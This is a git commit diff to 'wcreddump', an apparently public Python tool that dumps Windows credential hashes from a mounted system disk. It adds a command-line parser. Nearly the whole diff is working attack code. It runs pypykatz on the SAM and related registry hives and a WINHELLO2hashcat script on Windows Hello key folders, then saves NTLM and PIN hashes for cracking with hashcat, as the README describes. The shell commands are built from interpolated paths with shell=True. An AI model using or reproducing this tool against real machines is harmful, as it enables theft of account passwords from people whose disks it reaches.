f9e768ae60c0c467ff532420ed091cc5e8bf7007
truerustyy <lili35lili35@gmail.com>
2024-11-01 20:11:58 +0100

    added parser + many small fixes

--- README.md
+++ README.md
@@ -9,18 +9,22 @@ Requires the following conditions :
  - python >=3.10 with the following libs installed : dpapick3, PyCryptodome (`pip install dpapick3 PyCryptodome`)
  - `WINHELLO2hashcat.py` in the same directory as `wcreddump.py` (https://github.com/Banaanhangwagen/WINHELLO2hashcat)
  - A mounted drive with a windows os on it
- 
+
+### Now with parser !
+<img alt="wcreddump help / parser" src="https://github.com/truerustyy/wcreddump/blob/main/wcreddump%20help.png">
+Usage: wcreddump [-h] [--save | --no-save] [--os | --no-os] [-p P] [-d D] [-m {0,1,2}]
+All default parser options can be changed directly in the source code for more automation
+
 ### Usage exemple
 <img alt="Exemple usage of wcreddump on a kali linux." src="https://github.com/truerustyy/wcreddump/blob/main/wcreddump%20exemple3.png">
 
-Dumped data will be printed in terminal and saved automatically in the folder `outputs` with name of the drive and current unix time if `autosave` is set as `True`. `outputs` folder will be automatically created if inexistent.
+If used with all default settings, dumped data will be printed in terminal and saved automatically in the folder `outputs` with name of the drive and current unix time. `outputs` folder will be automatically created in the working directory if inexistent.
 Dumped hashes can be cracked using JTR or hashcat with `-m 1000` for NTLM.s from SAM hive, and `-m 28100` for pin.s from WINHELLO (https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 ### Other infos
 Tool tested on windows 10 22H2 build 19045.4170.
 As said in https://github.com/Banaanhangwagen/WINHELLO2hashcat?tab=readme-ov-file#remarks, systems with a TPM won't work as they are protected.
-As pypykatz automatically dumps some OS infos like LSA secrets or boot key, it is now possible to save them into a new `INFOS` file by turning on the `dumpInfos` boolean. Default to `False`.
 
-Provided "as is" without any warranty of any kind. Do not use for illegal purposes.
+Provided "as is" without any warranty of any kind. Do not use for illegal purposes and use at your own risks.
 Feel free to report bugs/mistakes or make suggesetions.
 Good luck on your crackings !
--- wcreddump.py
+++ wcreddump.py
@@ -1,4 +1,4 @@
-# wcreddump (windows credentials dump)
+# wcreddump (windows credentials dumper)
 # Automated script to dump login credentials hashes on windows disks, classic passwords and pins
 #
 #Requires the following conditions :
@@ -12,92 +12,110 @@
 # GitHub : https://github.com/truerustyy/wcreddump
 
 from subprocess import check_output
+from argparse import ArgumentParser, BooleanOptionalAction, RawDescriptionHelpFormatter
 from psutil import disk_partitions
-from time import time 
+from time import time
 import os
 
-### INIT ###
-autosave = True
-dumpInfos = False #will work only if autosave is on and mode 0 or 2 is used
-	
-outputDirectory = "/outputs/"
+### INIT + PARSER ###
 scriptPath = os.path.dirname(__file__)
 disks = disk_partitions()
+t = round(time(), 3)
 
-### DISK SELECTION ###
-drives = []
-i = 0
-for disk in disks :
-	if disk.fstype == "fuseblk" :
-		name = disk.mountpoint.split("/")[-1]
-		drives.append(name)
-		print(f"{i} : {name}")
-		i += 1
-if i == 0 :
-	print("no available drive, please make sure that a windows drive is mounted")
-	exit()
-elif i == 1 :
-	print(f"select windows system drive (0-0) : 0") 
-	driveID = 0
-else :
-	driveID = int(input(f"select windows system drive (0-{i-1}) : "))
-C = f"/media/kali/{drives[driveID]}"
-print()
+parser = ArgumentParser(prog="wcreddump", formatter_class=RawDescriptionHelpFormatter, description="Automated script to dump login credentials hashes on windows disks, classic passwords and pins\nAll flags are completely optionnal, script will ask during execution if informations are needed\nhttps://github.com/truerustyy/wcreddump", epilog="usage exemple :\npython wcreddump.py\npython wcreddump.py --no-save --os -m 1\npython wcreddump.py -p \"/path/to save/folder\" -c path/to/disk -m 2")
+parser.add_argument("--save", help="dump hashes/os info into files, default to True", action=BooleanOptionalAction, type=bool, default=True)
+parser.add_argument("--os", help="dump some os info with hashes, default to False", action=BooleanOptionalAction, type=bool, default=False)
+parser.add_argument("-p", help="path to save files, default to /[wd]/outputs/", type=str, default=scriptPath+"/outputs/")
+parser.add_argument("-d", help="path to mounted Windows system disk, automated selection by default", type=str, default=False)
+parser.add_argument("-m", help="attack mode (SAM, WINHELLO, both), default to 2", type=int, default=2, choices=[0, 1, 2])
+args = parser.parse_args()
+
+autosave, dumpInfos, savePath, mode, C = args.save, args.os, args.p, args.m, args.d
 
 ### DEBUG ###
-if not os.path.isdir(f"{C}/Windows/System32") :
-	print("error : selected drive is not a windows system drive")
-	exit()
-if autosave and not os.path.isdir(scriptPath+outputDirectory) :
-	os.makedirs(scriptPath+outputDirectory)
+if os.name == "nt" :
+    print("wcreddump need to be run from a linux/Unix environement, please read doc")
+    exit()
+if autosave and not os.path.isdir(savePath) :
+    os.makedirs(savePath)
+if savePath[-1] not in ["\\", "/"] :
+    savePath += "/"
+if (not autosave and scriptPath+"/outputs/" != savePath) or (not autosave and dumpInfos) : #if selected save path/os info but save de-activated
+    raise ValueError("save diseabled but os info or path flag set, please make sure flags are coherent")
 
-### ATTACK MODE SELECTION ###
-print("0 : dump SAM hive\n1 : dump WINHELLO\n2 : dump both if possible")
-mode = int(input(f"select attack mode (0-2) : "))
-print()
+### DISK SELECTION ###
+if not C :
+    drives = {}
+    i = 0
+    print("selectable drives : ")
+    for disk in disks :
+        if disk.fstype == "fuseblk" :
+            name, mnt = disk.mountpoint.split("/")[-1], disk.mountpoint
+            drives[name] = disk.mountpoint
+            print(f"{name}")
+            i += 1
+    if i == 0 :
+        print("no available drive, please make sure that a windows hard drive is mounted")
+        exit()
+    elif i == 1 :
+        print(f"select windows system drive : {name}") 
+        drive = name
+    else :
+        drive = input(f"select windows system drive : ")
+    if drive not in drives :
+        raise ValueError(f"selected drive ({drive}) not found in list")
+    else :
+        C = drives[drive]
+    print()
+
+if not os.path.isdir(f"{C}/Windows/System32") :
+    raise ValueError("selected drive is not a windows system drive")
+
+### ATTACK MODE SELECTION ### --> deprecated with parser, uncoment and set -d default to False to use
+#if not mode and not type(mode) == int :
+#   print("0 : dump SAM hive\n1 : dump WINHELLO\n2 : dump both if possible")
+#   mode = int(input(f"select attack mode (0-2) : "))
+#   print()
 
 ### SAM DUMPING ###
 if mode == 0 or mode == 2 :
-	print("dumping sam...")
-	path = f"{C}/Windows/System32/config"
-	print(f"full path to SAM hive : \"{path}\"")
-	os.chdir(path)
-	raw = check_output("pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM", shell=True).decode()
-	sam = "\n".join(raw.split("============== SAM hive secrets ==============")[1].split("============== SECURITY hive secrets ==============")[0].split("\n")[2:])
-	t = round(time(), 2)
-	print("\n"+sam)
-	os.chdir(scriptPath)
-	if autosave :
-		with open(scriptPath+f"{outputDirectory}SAM ({drives[driveID]})-{t}", "w") as f :
-			f.write(sam)
-		print(f"succesfully dumped SAM's hash.es to \"SAM ({drives[driveID]})-{t}\"\n")
-		if dumpInfos :
-			with open(scriptPath+f"{outputDirectory}INFOS ({drives[driveID]})-{t}", "w") as f :
-				f.write(raw)
-			print(f"succesfully dumped OS infos to \"INFOS ({drives[driveID]})-{t}\"\n")
-	
+    print("dumping sam...")
+    path = f"{C}/Windows/System32/config"
+    print(f"full path to SAM hive : \"{path}\"")
+    os.chdir(path)
+    raw = check_output("pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM", shell=True).decode()
+    sam = "\n".join(raw.split("============== SAM hive secrets ==============")[1].split("============== SECURITY hive secrets ==============")[0].split("\n")[2:])
+    print("\n"+sam)
+    os.chdir(scriptPath)
+    if autosave :
+        with open(f"{savePath}SAM ({drive})-{t}", "w") as f :
+            f.write(sam)
+        print(f"succesfully dumped SAM's hash.es to \"SAM ({drive})-{t}\"\n")
+        if dumpInfos :
+            with open(f"{savePath}INFOS ({drive})-{t}", "w") as f :
+                f.write(raw)
+            print(f"succesfully dumped OS infos to \"INFOS ({drive})-{t}\"\n")
 
 ### WINHELLO DUMPING ###
 if mode == 1 or mode == 2 :
-	print("dumping WINHELLO...")
-	if os.path.isdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") :
-		if os.listdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") != []:
-			cryptokeys = f'--cryptokeys  "{C}/Windows/ServiceProfiles/LocalService/AppData/Roaming/Microsoft/Crypto/Keys/"'
-			masterkey = f'--masterkey "{C}/Windows/System32/Microsoft/Protect/S-1-5-18/User/"'
-			system = f'--system "{C}/Windows/System32/config/SYSTEM"'
-			security = f'--security "{C}/Windows/System32/config/SECURITY"'
-			ngc = f'--ngc "{C}/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/"'
-			try :
-				hashes = check_output(f"python WINHELLO2hashcat.py {cryptokeys} {masterkey} {system} {security} {ngc}", shell=True).decode()
-				t = round(time(), 2)
-				print(hashes)
-				if autosave :
-					with open(scriptPath+f"{outputDirectory}WINHELLO ({drives[driveID]})-{t}", "w") as f :
-						f.write(hashes)
-				print(f"succesfully dumped WINHELLO pin.s to \"WINHELLO ({drives[driveID]})-{t}\"")
-			except :
-				print("error on dumping, see https://github.com/Banaanhangwagen/WINHELLO2hashcat")
-		else :
-			print("no WINHELLO on system")
-	else :
-		print("ivalid windows version (likely too old)")
+    print("dumping WINHELLO...")
+    if os.path.isdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") :
+        if os.listdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") != []:
+            cryptokeys = f'--cryptokeys  "{C}/Windows/ServiceProfiles/LocalService/AppData/Roaming/Microsoft/Crypto/Keys/"'
+            masterkey = f'--masterkey "{C}/Windows/System32/Microsoft/Protect/S-1-5-18/User/"'
+            system = f'--system "{C}/Windows/System32/config/SYSTEM"'
+            security = f'--security "{C}/Windows/System32/config/SECURITY"'
+            ngc = f'--ngc "{C}/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/"'
+            try :
+                hashes = check_output(f"python WINHELLO2hashcat.py {cryptokeys} {masterkey} {system} {security} {ngc}", shell=True).decode()
+                print(hashes)
+                if autosave :
+                    with open(f"{savePath}WINHELLO ({drive})-{t}", "w") as f :
+                        f.write(hashes)
+                print(f"succesfully dumped WINHELLO pin.s to \"WINHELLO ({drive})-{t}\"")
+            except :
+                print("error on dumping, see https://github.com/Banaanhangwagen/WINHELLO2hashcat")
+        else :
+            print("no WINHELLO on system")
+    else :
+        print("ivalid windows version for WINHELLO (likely too old)")
